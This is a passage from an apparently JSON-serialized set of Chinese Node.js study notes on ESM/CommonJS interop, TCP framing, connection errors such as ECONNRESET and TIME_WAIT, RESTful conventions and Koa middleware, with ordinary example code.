可能导致获取到部分初始化的对象\n- ESM\n\t- 使用绑定`引用`而不是值`拷贝`\n\t- 提供了`静态分析能力`，可以在`编译`时检测问题\n\t- `webpack 插件`或者 `vite 插件`检测是否循环引用了\n\n### 1.9. ESM 下处理循环引用的几个主要解决方案\n\n#### 1.9.1. **使用函数包装**\n\n```javascript\n// a.js\nimport { getB } from './b.js';\nexport const a = 1;\nexport function getA() { \n    return a; \n}\n\n// b.js\nimport { getA } from './a.js';\nexport const b = 2;\nexport function getB() { \n    return b; \n}\n```\n\n#### 1.9.2. **动态导入**\n\n```javascript\n// a.js\nexport const a = 1;\n// 使用动态导入替代静态导入\nconst b = await import('./b.js');\n\n// b.js\nexport const b = 2;\nconst a = await import('./a.js');\n```\n\n#### 1.9.3. **提取共享代码**\n\n```javascript\n// shared.js\nexport const shared = {};\n\n// a.js 和 b.js 都引用 shared.js\nimport { shared } from './shared.js';\n```\n\n### 1.10. 错误处理机制\n\n#### 1.10.1. cjs \n\n![图片&文件](./files/20241027.png)\n\n```javascript\n// CJS\ntry {\n    require('./non-existent');\n} catch (err) {\n    console.log(err.code);  // MODULE_NOT_FOUND\n}\n\n// ESM\nimport './non-existent.js'\n    .catch(err => {\n        console.log(err.code);  // ERR_MODULE_NOT_FOUND\n    });\n\n```\n\n## 2. ESM 和 CJS 的混合使用\n\n>  ==只要知道可以混用，并且需要配置 package.json 支持双模式即可==，需要时再查询即可\n\n### 2.1. ESM 中使用 CJS 模块\n\n```javascript hl:1,9\n// 方法1：使用 createRequire\nimport { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\n\n// 现在可以使用 require 了\nconst fs = require('fs');\nconst lodash = require('lodash');\n\n// 方法2：使用动态 import 代替 require\n// cjs-module.js (CommonJS)\nmodule.exports = { hello: 'world' };\n\n// esm-module.mjs (ESM)\nconst cjsModule = await import('./cjs-module.js');\nconsole.log(cjsModule.default.hello); // 注意：需要使用 .default\n```\n\n### 2.2. CJS 中使用 ESM 模块\n\n```javascript hl:1,12\n// 方法1：使用异步 import()\n// esm-module.mjs\nexport const hello = 'world';\n\n// cjs-module.js\nasync function loadEsm() {\n    const esmModule = await import('./esm-module.mjs');\n    console.log(esmModule.hello);\n}\nloadEsm();\n\n// 方法2：使用 async/await 包装\n(async () => {\n    const { hello } = await import('./esm-module.mjs');\n    console.log(hello);\n})();\n```\n\n### 2.3. 包装 CJS 模块为 ESM\n\n```javascript hl:8\n// wrapper.mjs\nimport { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\n\n// 导入 CJS 模块\nconst cjsModule = require('./cjs-module');\n\n// 重新导出为 ESM\nexport const { methodA, methodB } = cjsModule;\nexport default cjsModule;\n```\n\n### 2.4. 在 package.json 中配置双模式支持\n\n```json\n{\n    \"name\": \"my-package\",\n    \"exports\": {\n        \".\": {\n            \"import\": \"./dist/index.mjs\",\n            \"require\": \"./dist/index.cjs\"\n        }\n    },\n    \"main\": \"./dist/index.cjs\",\n    \"module\": \"./dist/index.mjs\",\n    \"type\": \"module\"\n}\n```\n\n### 2.5. 条件导出\n\n```javascript\n// index.cjs\nif (typeof require !== 'undefined') {\n    module.exports = require('./cjs/index.js');\n}\n\n// index.mjs\nexport * from './esm/index.js';\n```\n\n### 2.6. 处理不同的导出方式\n\n```javascript hl:10\n// CJS 模块\n// math.cjs\nmodule.exports = {\n    add: (a, b) => a + b,\n    subtract: (a, b) => a - b\n};\n\n// ESM 包装器\n// math.mjs\nimport { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\n\nconst cjsMath = require('./math.cjs');\n\n// 重新导出为具名导出\nexport const { add, subtract } = cjsMath;\n\n// 同时提供默认导出\nexport default cjsMath;\n```\n\n### 2.7. 处理异步操作\n\n```javascript\n// async-cjs.cjs\nmodule.exports = async function getData() {\n    return Promise.resolve('data');\n};\n\n// async-esm.mjs\nimport { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\n\nconst getData = require('./async-cjs.cjs');\n\n// 使用异步函数包装\nexport async function fetchData() {\n    return await getData();\n}\n```\n\n### 2.8. 类型定义的处理\n\n```typescript\n// types.d.ts\ndeclare module 'my-mixed-module' {\n    // CJS 风格\n    export = {\n        method: () => void\n    };\n    \n    // ESM 风格\n    export const method: () => void;\n}\n```\n\n### 2.9. 动态导入处理\n\n- 先尝试 ESM 导入\n- 降级到 CJS\n\n```javascript\n// dynamic-import.mjs\nasync function loadModule(modulePath) {\n    try {\n        // 尝试 ESM 导入\n        return await import(modulePath);\n    } catch (err) {\n        // 降级到 CJS\n        const require = createRequire(import.meta.url);\n        return require(modulePath);\n    }\n}\n```\n\n### 2.10. 环境检测：`typeof require === 'undefined'`\n\n```javascript\n// utils.js\nexport function isESM() {\n    return typeof require === 'undefined';\n}\n\nexport function isCJS() {\n    return typeof require !== 'undefined';\n}\n\n// 根据环境使用不同的导入方式\nconst loader = isESM() ? \n    (m) => import(m) : \n    (m) => Promise.resolve(require(m));\n```\n\n### 2.11. 错误处理\n\n```javascript\n// error-handler.mjs\nexport async function safeImport(modulePath) {\n    try {\n        const module = await import(modulePath);\n        return module;\n    } catch (err) {\n        if (err.code === 'ERR_REQUIRE_ESM') {\n            // 处理 ESM 模块的情况\n            console.log('This is an ESM module');\n        } else if (err.code === 'MODULE_NOT_FOUND') {\n            // 处理模块未找到的情况\n            console.log('Module not found');\n        }\n        throw err;\n    }\n}\n```\n\n### 2.12. 构建工具配置\n\n```javascript\n// rollup.config.js\nimport commonjs from '@rollup/plugin-commonjs';\n\nexport default {\n    input: 'src/index.js',\n    output: [\n        {\n            file: 'dist/bundle.cjs.js',\n            format: 'cjs'\n        },\n        {\n            file: 'dist/bundle.esm.js',\n            format: 'esm'\n        }\n    ],\n    plugins: [\n        commonjs() // 转换 CJS 到 ESM\n    ]\n};\n```\n\n### 2.13. 最佳实践建议\n\n1. 尽可能使用 ESM\n2. 为旧模块提供 ESM 包装器\n3. **在 package.json 中提供双模式支持**\n4. 使用构建工具处理兼容性\n5. 谨慎处理异步操作\n6. 提供清晰的类型定义\n7. 做好错误处理\n8. 考虑向后兼容性\n\n这样的混合使用策略可以帮助你在过渡期间平稳地处理不同模块系统的代码。\n\n## 3. `module.exports` 和 `exports` 的区别\n\n### 3.1. 基本关系\n\n```javascript\n// Node.js 模块系统中\nexports = module.exports = {};  // 初始时，exports 是 module.exports 的引用\n```\n\n### 3.2. 关键区别\n\n```javascript hl:8\n// 正确使用\nexports.foo = 'bar';           // 添加属性有效\n\nmodule.exports.foo = 'bar';    // 添加属性有效\nmodule.exports = { foo: 'bar' };// 直接赋值有效\n\n// 错误使用\n// 无效！这会断开与 module.exports 的引用\nexports = { foo: 'bar' };      \n```\n\n### 3.3. 简单记忆\n\n- `exports` 只能通过 `.` 语法添加属性\n- `module.exports` 可以直接赋值新对象\n- 最终导出的始终是 `module.exports` 的值\n\n### 3.4. 最后\n\n- 总结：`exports` 是 `module.exports` 的引用，`exports` 只能通过 `.`添加属性\n\t- 因此，为避免混淆，建议统一使用 `module.exports`\n\n## 4. Node.js 在使用 ES modules 时要求加上文件扩展名有几个重要原因\n\n### 4.1. 明确性和性能\n\nNode.js 要求在导入 ES modules 时使用文件扩展名，主要是为了提高模块解析的明确性和性能。\n\n```javascript\n// 正确的导入方式\nimport { someFunction } from './myModule.js';\n\n// 错误的导入方式（在 ES modules 中）\nimport { someFunction } from './myModule'; // 这将导致错误\n```\n\n通过明确指定文件扩展名，Node.js 可以直接定位到正确的文件，而不需要尝试多种可能的文件扩展名。这样可以减少文件系统的查找次数，提高模块加载的效率。\n\n### 4.2. 与浏览器环境的一致性\n\n在浏览器环境中，使用 ES modules 时通常需要指定完整的文件名（包括扩展名）。Node.js 采用相同的方式可以保持与浏览器环境的一致性，使得代码在不同环境中的行为更加一致。\n\n```html hl:2\n<!-- 在浏览器中 -->\n<script type=\"module\" src=\"./myModule.js\"></script>\n```\n\n### 4.3. 避免歧义\n\n在 Node.js 中，不同的文件扩展名可能对应不同的模块类型或处理方式。例如，`.js`、`.mjs`、`.cjs` 分别可能表示不同的模块系统。通过明确指定扩展名，可以避免潜在的歧义。\n\n```javascript\nimport { func1 } from './module1.js';  // ES module\nimport { func2 } from './module2.mjs'; // ES module（显式）\nconst { func3 } = require('./module3.cjs'); // CommonJS module\n```\n\n### 4.4. 简化模块解析逻辑\n\n通过要求明确的文件扩展名，Node.js 可以简化其模块解析逻辑。这不仅提高了性能，还减少了可能的错误和意外行为。\n\n### 4.5. 区分文件类型\n\n在一个项目中，可能存在同名但不同类型的文件（如 `data.json` 和 `data.js`）。强制使用扩展名可以明确指定要导入的确切文件。\n\n```javascript\nimport data from './data.json';\nimport { processData } from './data.js';\n```\n\n### 4.6. 未来兼容性\n\n这种做法为未来可能出现的新文件类型或模块系统留下了扩展空间，而不会破坏现有的导入语句。\n\n","ct0OysVD":"\n# nodejs server 端如何清除  cookie\n\n`#nodejs` \n\n- Express\n\t-  `res.clearCookie(name)`\n- Koa:\n\t- `ctx.cookies.set(name, null)`\n- 原生\n\t-  `res.setHeader('Set-Cookie', 'name=; Max-Age=0')`\n\n实际应用，通过 `/logout` 来退出登录，清除 `cookie` 等\n\n安全相关：\n\n```javascript\nconst cookieOptions = {\n    path: '/',\n    httpOnly: true,    // 防止 XSS\n    secure: true,      // 仅 HTTPS\n    sameSite: 'strict' // 防止 CSRF\n};\n```\n","ayYSBwsE":"\n# Node.js 中提高网络传输速度的主要方法\n\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 启用`压缩`\n- 使用 HTTP/2\n- 实现合适的`缓存`策略\n- 使用`流式`传输\n- 保持`长连接`\n- 负载均衡\n- 使用`内存缓存`\n\n> 根据具体场景选择合适的优化方案，通常需要**多种方案组合使用**才能达到最佳效果。\n\n## 2. 启用 Gzip 压缩\n\n```javascript\nconst express = require('express');\nconst compression = require('compression');\nconst app = express();\n\n// 启用 Gzip 压缩\napp.use(compression({\n    // 只压缩大于 1kb 的响应\n    threshold: 1024,\n    // 设置压缩级别\n    level: 6,\n    // 设置需要压缩的类型\n    filter: (req, res) => {\n        if (req.headers['x-no-compression']) {\n            return false;\n        }\n        return compression.filter(req, res);\n    }\n}));\n```\n\n## 3. 使用 HTTP/2\n\n```javascript\nconst http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n    key: fs.readFileSync('server.key'),\n    cert: fs.readFileSync('server.crt')\n});\n\nserver.on('stream', (stream, headers) => {\n    // HTTP/2 支持多路复用\n    stream.respond({\n        'content-type': 'text/html',\n        ':status': 200\n    });\n    stream.end('<h1>Hello World</h1>');\n});\n```\n\n## 4. 实现缓存策略：HTTP 缓存： `Cache-Control/Etag`\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// 静态文件缓存\napp.use(express.static('public', {\n    maxAge: '1d',  // 缓存一天\n    etag: true,    // 启用 ETag\n    lastModified: true\n}));\n\n// API 响应缓存\napp.get('/api/data', (req, res) => {\n    res.setHeader('Cache-Control', 'public, max-age=3600');\n    res.setHeader('ETag', 'W/\"123-123\"');\n    \n    // 检查是否命中缓存\n    if (req.fresh) {\n        return res.status(304).end();\n    }\n    \n    res.json({ data: 'some data' });\n});\n```\n\n## 5. 使用流式传输 ： 如`fs.createReadStream`\n\n```javascript\nconst fs = require('fs');\n\n// 文件传输使用流\napp.get('/download', (req, res) => {\n    const fileStream = fs.createReadStream('large-file.mp4');\n    fileStream.pipe(res);\n});\n\n// 大数据响应使用流\napp.get('/large-data', (req, res) => {\n\n    res.setHeader('Content-Type', 'application/json');\n    \n    const streamData = async function*() {\n        for (let i = 0; i < 1000000; i++) {\n            yield JSON.stringify({ id: i }) + '\\n';\n        }\n    };\n    \n    const stream = Readable.from(streamData());\n    \n    stream.pipe(res);\n    \n});\n```\n\n## 6. 启用 Keep-Alive\n\n```javascript hl:5,4\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader('Connection', 'keep-alive');\n    res.setHeader('Keep-Alive', 'timeout=5');\n});\n\n// 或使用 agent\nconst agent = new http.Agent({\n    keepAlive: true,\n    keepAliveMsecs: 3000,\n    maxSockets: 100\n});\n```\n\n## 7. 使用负载均衡  →  \n\n> 主进程：只用于创建多个 `cluster 进程`\n> 非主进程：用于创建 `express 服务`，因为任务是隔离的\n\n```javascript hl:4,9\nconst cluster = require('cluster');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n    // 主进程创建工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        cluster.fork();\n    }\n} else {\n    // 工作进程创建服务器\n    const express = require('express');\n    const app = express();\n    app.listen(3000);\n}\n```\n\n## 8. 使用**内存缓存**  →  `node-cache`\n\n```javascript hl:1,2\nconst NodeCache = require('node-cache');\nconst myCache = new NodeCache({ stdTTL: 100 });\n\napp.get('/api/data', async (req, res) => {\n    const key = req.url;\n    const cachedData = myCache.get(key);\n    \n    if (cachedData) {\n        return res.json(cachedData);\n    }\n    \n    const data = await fetchData();\n    myCache.set(key, data);\n    res.json(data);\n});\n```\n","RCGKzy0Z":"\n# RESTful 接口规范\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 资源（Resources） \n\n`RESTful`（Representational State Transfer）API 的核心概念是**资源**。\n- **每个资源都应该有一个唯一的 URI（统一资源标识符）**。\n- **系统中所有事务都是资源**\n\n例如：\n\n```\n/users         // 用户集合\n/users/123     // 特定用户\n/articles      // 文章集合\n/articles/456  // 特定文章\n```\n\n## 2. HTTP 方法（HTTP Methods）\n\n使用标准的 HTTP 方法来对资源进行操作：\n\n- GET：获取资源\n- `POST`：创建新资源\n- PUT：更新资源（全量更新）\n- `PATCH`：部分更新资源\n- `DELETE`：删除资源\n\n例如：\n\n```\nGET /users         // 获取所有用户\nPOST /users        // 创建新用户\nGET /users/123     // 获取特定用户\nPUT /users/123     // 更新特定用户\nDELETE /users/123  // 删除特定用户\n```\n\n## 3. 无状态（Stateless）\n\n每个请求应该包含所有==必要的信息==，服务器不应该在不同请求之间保存客户端状态。\n\n>  因为 HTTP 是无状态\n\n## 4. 统一接口（Uniform Interface）\n\nAPI 应该有一个一致的接口，这包括：\n\n- 资源标识\n- 通过表述来操作资源\n- 自描述消息\n- 超媒体作为应用状态引擎（`HATEOAS`）\n\n## 5. 响应状态码（Response Status Codes）\n\n使用适当的 HTTP 状态码来表示请求的结果：\n\n```\n200 OK              // 成功\n201 Created         // 创建成功\n204 No Content      // 成功但无返回内容\n400 Bad Request     // 客户端错误\n401 Unauthorized    // 未授权\n403 Forbidden       // 禁止访问\n404 Not Found       // 资源不存在\n500 Internal Server Error  // 服务器错误\n```\n\n## 6. 数据格式（Data Formats）\n\n通常使用 JSON 作为数据交换格式，但也可以支持其他格式如 XML。\n\n```json\n{\n  \"id\": 123,\n  \"name\": \"John Doe\",\n  \"email\": \"john@example.com\"\n}\n```\n\n## 7. 版本控制（Versioning）\n\n在 URI 中包含 API 版本：\n\n```\n/api/v1/users\n/api/v2/users\n```\n\n## 8. 过滤、排序和分页（Filtering, Sorting, and Pagination）\n\n使用查询参数来实现：\n\n```\n/users?role=admin          // 过滤\n/users?sort=name_asc       // 排序\n/users?page=2&limit=20     // 分页\n```\n\n## 9. 错误处理（Error Handling）\n\n提供清晰和一致的错误消息：\n\n```json\n{\n  \"error\": {\n    \"code\": 404,\n    \"message\": \"User not found\"\n  }\n}\n```\n\n## 10. 安全性（Security）\n\n使用 HTTPS 来加密所有通信。对于需要认证的端点，使用 `token` 或 `OAuth` 等机制。\n\n## 11. 文档（Documentation）\n\n提供完整和清晰的 API 文档，包括每个端点的描述、参数、响应格式等。\n\n## 12. 实际应用示例\n\n假设我们有一个博客 API，下面是一些符合 RESTful 规范的端点设计：\n\n```js\nGET /api/v1/posts                               // 获取所有文章\nGET /api/v1/posts?author=john&sort=date_desc  // 获取 John 的文章，按日期降序排列\nPOST /api/v1/posts          // 创建新文章\nGET /api/v1/posts/789       // 获取特定文章\nPUT /api/v1/posts/789       // 更新特定文章\nDELETE /api/v1/posts/789    // 删除特定文章\nGET /api/v1/posts/789/comments  // 获取特定文章的评论\nPOST /api/v1/posts/789/comments // 为特定文章添加评论\n```\n\n\n","cOLLBCOP":"\n# TCP 粘包\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. TCP 粘包问题 \n\n>  多个数据包重组时发生\n\nTCP 粘包是因为 TCP 是`面向流`的协议，传输数据时会将数据拆分成==多个数据包==进行传输，`接收方`收到数据后会按序`重组`。这可能导致两种情况：\n\n1. ==多个小数据包合并成一个大数据包==\n2. ==一个大数据包被分割成多个小数据包==\n\n```ascii\n发送数据：\n包1: \"Hello\" | 包2: \"World\"\n\n可能的接收情况：\n情况1（粘包）: \"HelloWorld\"\n情况2（拆包）: \"Hel\" \"loWorld\"\n```\n\n## 2. TCP 粘包解决方案\n\n### 2.1. 固定长度\n\n```javascript\n// 固定长度方案\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n    const FIXED_LENGTH = 10;\n    let buffer = Buffer.alloc(0);\n\n    socket.on('data', (data) => {\n        buffer = Buffer.concat([buffer, data]);\n        \n        // 当数据足够时，按固定长度解析\n        while (buffer.length >= FIXED_LENGTH) {\n            const message = buffer.slice(0, FIXED_LENGTH);\n            buffer = buffer.slice(FIXED_LENGTH);\n            console.log('收到消息:', message.toString());\n        }\n    });\n});\n```\n\n### 2.2. 分隔符\n\n```javascript\n// 使用分隔符方案\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n    let buffer = '';\n    const DELIMITER = '\\n';\n\n    socket.on('data', (data) => {\n        buffer += data;\n        \n        let index;\n        while ((index = buffer.indexOf(DELIMITER)) !== -1) {\n            const message = buffer.slice(0, index);\n            buffer = buffer.slice(index + 1);\n            console.log('收到消息:', message);\n        }\n    });\n});\n```\n\n### 2.3. 消息头标识长度\n\n```javascript\n// 消息头标识长度方案\nconst net = require('net');\n\nclass Protocol {\n    static pack(message) {\n        const body = Buffer.from(message);\n        const header = Buffer.alloc(4);\n        header.writeUInt32BE(body.length);\n        return Buffer.concat([header, body]);\n    }\n\n    static unpack(buffer) {\n        if (buffer.length < 4) return null;\n        \n        const length = buffer.readUInt32BE(0);\n        if (buffer.length < length + 4) return null;\n        \n        const body = buffer.slice(4, length + 4);\n        const remaining = buffer.slice(length + 4);\n        \n        return {\n            message: body.toString(),\n            remaining: remaining\n        };\n    }\n}\n\n// 服务端示例\nconst server = net.createServer((socket) => {\n    let buffer = Buffer.alloc(0);\n\n    socket.on('data', (data) => {\n        buffer = Buffer.concat([buffer, data]);\n        \n        let result;\n        while ((result = Protocol.unpack(buffer))) {\n            console.log('收到消息:', result.message);\n            buffer = result.remaining;\n        }\n    });\n});\n\n// 客户端示例\nconst client = new net.Socket();\nclient.connect(3000, '127.0.0.1', () => {\n    const message = Protocol.pack('Hello World');\n    client.write(message);\n});\n```\n\n## 3. UDP 粘包问题 → 每个数据包都是独立\n\nUDP 不存在粘包问题，因为：\n\n1. UDP 是基于消息的协议，**每个数据包都是独立的**\n2. UDP 不保证数据包的顺序和可靠性\n3. 每个 UDP 数据包都有明确的界限\n\n```javascript\n// UDP 示例\nconst dgram = require('dgram');\n\n// UDP 服务器\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n    // UDP 每个消息都是完整的，不会粘包\n    console.log(`收到消息: ${msg} 来自 ${rinfo.address}:${rinfo.port}`);\n});\n\nserver.bind(3000);\n\n// UDP 客户端\nconst client = dgram.createSocket('udp4');\n\n// 发送多个消息\nclient.send('Hello', 3000, 'localhost');\nclient.send('World', 3000, 'localhost');\n```\n\n## 4. 总结比较\n\n1. TCP 粘包原因：\n\t- TCP 是`流式`协议\n\t- TCP 有缓冲区机制\n\t- ==数据包的发送和接收==不一定一一对应\n2. UDP 无粘包原因：\n\t- UDP 是消息边界协议\n\t- 每个数据包都是==独立==的\n\t- 一次接收一个完整的数据包\n3. TCP 粘包解决方案：\n\t- 固定长度\n\t- 分隔符\n\t- 消息头+消息体\n\t- 自定义协议\n\n## 5. 建议\n\n   - TCP 应用建议使用**消息头+消息体**方案\n   - 对于简单应用可以使用**分隔符**方案\n   - UDP 应用需要考虑数据包大小限制和丢包处理\n","cfQUXb09":"\n# TIME_WAIT 过多的原因以及解决方案\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. TIME_WAIT 过多的原因 \n\n### 1.1. 短连接过多\n\n```javascript\n// 不良示例：频繁创建短连接\nconst http = require('http');\n\nsetInterval(() => {\n    http.get('http://example.com', (res) => {\n        // 处理完立即关闭\n        res.on('end', () => {\n            // 连接关闭，进入 TIME_WAIT\n        });\n    });\n}, 100);\n```\n\n### 1.2. 客户端主动关闭连接\n\n```javascript\n// 不良示例：客户端频繁主动关闭连接\nconst net = require('net');\nconst client = new net.Socket();\n\nclient.connect(3000, '127.0.0.1', () => {\n    client.end(); // 客户端主动关闭，将产生 TIME_WAIT\n});\n```\n\n### 1.3. 高并发下的**连接复用不足**\n\n## 2. 解决方案\n\n### 2.1. 启用 TCP keepalive 保持长连接\n\n```javascript hl:2\n// 服务端启用 keepalive\nconst server = net.createServer((socket) => {\n    socket.setKeepAlive(true, 60000); // 60秒\n});\n\n// 或在 HTTP 服务中\nconst server = http.createServer((req, res) => {\n    res.setHeader('Connection', 'keep-alive');\n    res.setHeader('Keep-Alive', 'timeout=5'); // 5秒超时\n});\n```\n\n### 2.2. 使用==连接池==\n\n```javascript\n// 使用连接池示例\nconst generic_pool = require('generic-pool');\n\nconst factory = {\n    create: async () => {\n        const client = new net.Socket();\n        await new Promise((resolve) => {\n            client.connect(3000, '127.0.0.1', resolve);\n        });\n        return client;\n    },\n    destroy: (client) => {\n        return new Promise((resolve) => {\n            client.end();\n            client.on('close', resolve);\n        });\n    }\n};\n\nconst pool = generic_pool.createPool(factory, {\n    max: 10, // 最大连接数\n    min: 2   // 最小连接数\n});\n```\n\n### 2.3. 系统层面优化\n\n```bash\n# 修改 TIME_WAIT 超时时间\nsysctl -w net.ipv4.tcp_fin_timeout=30\n\n# 允许 TIME_WAIT 状态的 socket 重用\nsysctl -w net.ipv4.tcp_tw_reuse=1\n\n# 快速回收 TIME_WAIT 连接\nsysctl -w net.ipv4.tcp_tw_recycle=1  # 注意：在 Linux 4.12+ 已被移除\n```\n\n### 2.4. 负载均衡 →  使用 Node.js cluster 模块做负载均衡\n\n```javascript\n// 使用 Node.js cluster 模块做负载均衡\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n    // 启动多个工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        cluster.fork();\n    }\n} else {\n    // 工作进程创建服务器\n    http.createServer((req, res) => {\n        res.writeHead(200);\n        res.end('hello world\\n');\n    }).listen(8000);\n}\n```\n\n## 3. 最佳实践建议\n\n### 3.1. 服务端设计\n\n   - 尽量使用==长连接==\n   - 实现**连接池**机制\n   - 合理配置 keepalive 参数\n\n### 3.2. 客户端设计\n\n   - 使用**连接池**\n   - **避免频繁创建短连接**\n   - 适当使用**长连接**\n\n### 3.3. 系统配置\n\n   - 适当调整系统参数\n   - 配置负载均衡\n   - 监控 `TIME_WAIT` 状态\n\n### 3.4. 架构优化\n\n   - 使用反向代理\n   - 实现服务端负载均衡\n   - 合理设置超时时间\n","XkYyZgZn":"\n# socket hang up\n\n `#nodejs` `#后端`\n\n\n## 目录\n<!-- toc -->\n ## 1. 主要原因 \n\n>  socket hang up 表示连接意外中断，通常是因为**在客户端还在等待响应时，服务器关闭了连接**\n\n## 2. 常见场景\n\n### 2.1. 请求超时\n\n```javascript\n// 服务端设置了超时时间，但处理时间过长\nconst server = http.createServer((req, res) => {\n    // 长时间操作，超过了默认超时时间\n    setTimeout(() => {\n        res.end('done');  // 可能已经超时，触发 socket hang up\n    }, 2 * 60 * 1000);\n});\n```\n\n### 2.2. 服务端提前关闭\n\n```javascript\n// 服务端提前结束响应\napp.get('/api', (req, res) => {\n    res.socket.destroy();  // 强制关闭连接\n    // 或\n    res.destroy();\n});\n```\n\n### 2.3. 代理超时\n\n```javascript\n// 代理请求超时\nconst proxy = http.request(options, (res) => {\n    // 处理响应\n});\n// 未设置超时处理\nproxy.end();\n```\n\n## 3. 解决方案\n\n### 3.1. 设置合适的超时时间\n\n```javascript\n// 服务端\nserver.timeout = 120000; // 设置2分钟超时\n\n// 客户端\nconst req = http.request(options);\nreq.setTimeout(120000);\n```\n\n### 3.2. 正确的错误处理\n\n```javascript\nconst axios = require('axios');\n\naxios.get('/api')\n    .catch(error => {\n        if (error.code === 'ECONNRESET') {\n            console.log('连接被重置');\n        }\n    });\n```\n\n### 3.3. 实现重试机制\n\n```javascript\nasync function fetchWithRetry(url, retries = 3) {\n    for (let i = 0; i < retries; i++) {\n        try {\n            return await fetch(url);\n        } catch (err) {\n            if (i === retries - 1) throw err;\n            await new Promise(r => setTimeout(r, 1000 * i));\n        }\n    }\n}\n```\n\n### 3.4. 使用 keep-alive\n\n```javascript hl:3\nconst agent = new http.Agent({\n    keepAlive: true,\n    keepAliveMsecs: 3000\n});\n```\n\n### 3.5. 总结\n\n- 设置合理的超时时间\n- 添加错误处理\n- 实现重试机制\n- 使用长连接（适当场景）\n\n","wmTOqH3a":"\n# Nodejs 加载 JSON 文件\n\n`#nodejs` \n\n总结：\n- `require`\n- `readFile` 或者 `readFileSync` \n- `require` 和 `readFileSync` 的区别？\n- 流式处理：\n\t- stream 、createWriteStream 、new Readable 等\n\t- fs.createReadStream\n\n\n## 目录\n<!-- toc -->\n ## 1. 磁盘上某目录下有100个JSON文件，请合并成 1个JSON文件 \n\n- 使用 `require` 直接简单同步写入，然后合并\n\t- **同步阻塞，内存消耗大**\n- 使用 `readFile` 异步读取，并修改成 Promise \n\t- ==可并发，但内存占用高==\n- 流处理：引入 `stream` 、 `createWriteStream` 、`new Readalble`\n\t- ==内存占用低，可处理大文件，但串行处理，速度较慢==\n- 工作线程：使用 `worker_threads` \n\t- 充分利用多核 CPU，并行处理\n- 优化的流处理\n\t- 异步 + 流处理\n\n补充说明：\n- 所有方案都应该添加`错误处理`\n- 生产环境中应该添加`日志记录`\n- 可以根据具体需求`调整并发数和缓冲区大小`\n- 考虑添加`进度提示`功能\n\n## 2. require 和 readFileSync 加载一个 JSON 文件的区别\n\n- 是否缓存\n\t- `require` 会缓存，所以会**常驻内存**\n\t- `readFileSync` 每次都重新读取，所以 **不常驻内存**\n- 文件更新处理\n\t- `require` 不会感知文件更新，即使外部修改了， 依然是从缓存里获取**旧数据**\n\t- `readFileSync` 每次都是**最新数据**\n- 错误处理\n\t- `require` 的错误处理，会抛出 `MODULE_NOT_FOUND` 错误\n\t- `readFileSync` 的错误处理，会抛出 ENOENT 错误（ENOENT = Error NO ENTry（或 Error NO ENTity））\n\t\t- 表示系统找不到指定的文件或目录\n\t\t- 主要原因包括路径错误、权限问题、异步操作顺序等\n- 路径解析\n\t- require 使用**模块解析**规则\n\t- `readFileSync` 使用**文件系统**路径\n- 实际应用场景\n\t- require：\n\t\t- 配置文件（不需要动态更新）、静态数据、模块化的 JSON 数据\n\t- `readFileSync`：\n\t\t- 文件监控场景、需要动态更新的配置、**大文件处理** \n\t\t- 但大文件建议考虑使用**流式**处理\n\n","7ZNEqgho":"\n# ECONNRESET\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\nECONNRESET（`Connection Reset`）错误表示连接被对方强制关闭。\n- 简单来说就是：\n\t- TCP 连接中，一方突然收到了 RST 包，连接被重置\n- `ECONNRESET`是因为TCP连接的**对端(通常是server)突然断开了连接**。\n- `server` 一般都设置了`keepalive`，对于不活动的连接会超时断开\n\n## 2. 常见原因\n\n### 2.1. 服务端主动关闭连接\n\n```javascript\n// 服务端突然关闭\nsocket.destroy();\n```\n\n### 2.2. 防火墙干扰\n\n- 连接空闲被防火墙切断\n- 某些包被防火墙拦截\n\n### 2.3. 客户端继续发送数据，但服务端已关闭\n\n```javascript\n// 错误示例\nsocket.on('end', () => {\n    // 服务端已关闭，但还在写数据\n    socket.write('data');  // 可能触发 ECONNRESET\n});\n```\n\n## 3. 解决方案\n\n### 3.1. 使用 keep-alive 保持连接活跃\n\n```javascript\nsocket.setKeepAlive(true, 1000);\n```\n\n### 3.2. 优雅关闭连接\n\n```javascript\nsocket.end(() => {\n    // 确保数据发送完毕后再关闭\n    socket.destroy();\n});\n```\n\n### 3.3. 添加错误处理\n\n```javascript\nsocket.on('error', (err) => {\n    if (err.code === 'ECONNRESET') {\n        // 处理连接重置\n        console.log('连接被重置');\n    }\n});\n```\n\n### 3.4. 实现重连机制\n\n```javascript\nfunction connect() {\n    const socket = new net.Socket();\n    socket.on('error', (err) => {\n        if (err.code === 'ECONNRESET') {\n            setTimeout(() => connect(), 1000);\n        }\n    });\n}\n```\n","KYPVK1vR":"\n# Koa 的核心原理\n\n`#koa` `#nodejs` `#R1` \n\n> Koa 是一个轻量级的 Node.js Web 框架\n\n\n## 目录\n<!-- toc -->\n ## 1. 中间件机制与洋葱模型 \n\nKoa 最核心的特性是其`中间件机制`，采用洋葱模型（Onion Model）。这种模型的工作方式如下：\n\n![图片&文件](./files/20241101-29.png)\n\n![图片&文件](./files/20241101-27.png)\n\n### 1.1. 中间件的核心实现原理\n\n```javascript hl:4,12,17,28\n// 简化版的中间件实现原理\nclass Koa {\n  constructor() {\n    this.middleware = [];\n  }\n\n  use(fn) {\n    this.middleware.push(fn);\n    return this;\n  }\n\n  // 核心的中间件组合函数\n  compose(middleware) {\n    return function(context, next) {\n      let index = -1;\n      \n      function dispatch(i) {\n        if (i <= index) {\n          return Promise.reject(new Error('next() called multiple 